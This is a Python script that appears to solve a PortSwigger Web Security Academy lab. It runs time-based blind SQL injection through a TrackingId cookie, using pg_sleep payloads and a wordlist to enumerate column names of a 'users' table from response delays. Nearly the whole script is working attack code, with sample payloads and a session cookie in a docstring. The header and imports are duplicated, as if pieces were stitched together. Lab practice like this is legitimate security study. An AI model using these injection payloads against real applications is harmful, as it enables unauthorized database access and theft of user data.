#!/usr/bin/env python3

import requests
from time import time
import urllib.parse

"""
'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(0)+ELSE+pg_sleep(10)+END--
Cookie: TrackingId=1H0mqQasF2if0yX1; session=RjVw5aZdHmXF6xfpksZR0jz5z2RwNYoY
payload = f'''{trackingid}';SELECT CASE WHEN (1=1) THEN pg_sleep(0) ELSE pg_sleep(10) END--;'''

"""
trackingid = '1H0mqQasF2if0yX1'

url = 'https://0aa4006c044d901780e66c0d006e00c1.web-security-academy.net/'

#!/usr/bin/env python3

import requests
from time import time
import urllib.parse

def readFile(filePath):
    listWordlist = list()
    # Try to grab a common table names wordlist
    try:
        with open(filePath, 'r') as file:
            for line in file:
                wordlistRawData = line.strip().split('\n')

                # Clean all unnecessary comments, empty lists. Then append them to a list
                if wordlistRawData == [''] or '#' in wordlistRawData[0]:
                    continue
                else:
                    listWordlist.append(wordlistRawData)
        return listWordlist
    except:
        print('[-] Couldn\'t read the file...')

def main(listWordlist, sessionId):

    # Send the payload
    try:
        for columnName in listWordlist:
            print(f'[*] Trying column: {columnName[0]:^20s}', end='\r')
            payload = f"""{trackingid}';SELECT CASE WHEN (column_name='{columnName[0]}') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM information_schema.columns WHERE table_name='users'--"""
            finalPayload = urllib.parse.quote(payload)

            cookie = {
                'session': sessionId,
                'TrackingId': finalPayload
            }

            startTime = time()
            requests.get(url, cookies=cookie)
            endTime = time()

            timeDifference = endTime - startTime

            if timeDifference >= 3:
                print(f'[+] Found column: {columnName[0]:^20s}')
                print(f'[+] The request time difference is: {timeDifference:.2f}s')
    except KeyboardInterrupt:
        print('\n[*] Bye!')

if __name__ == '__main__':
    # Wordlist from sqlmap (GitHub: https://raw.githubusercontent.com/drtychai/wordlists/master/sqlmap/common-tables.txt)
    filePath = 'C:\\Users\Ahmed Abdulwhhab\\PycharmProjects\\pythonProject1\\venv\\wordlist.txt'

    listWordlist = readFile(filePath)

    sessionId = 'RjVw5aZdHmXF6xfpksZR0jz5z2RwNYoY'
    main(listWordlist, sessionId)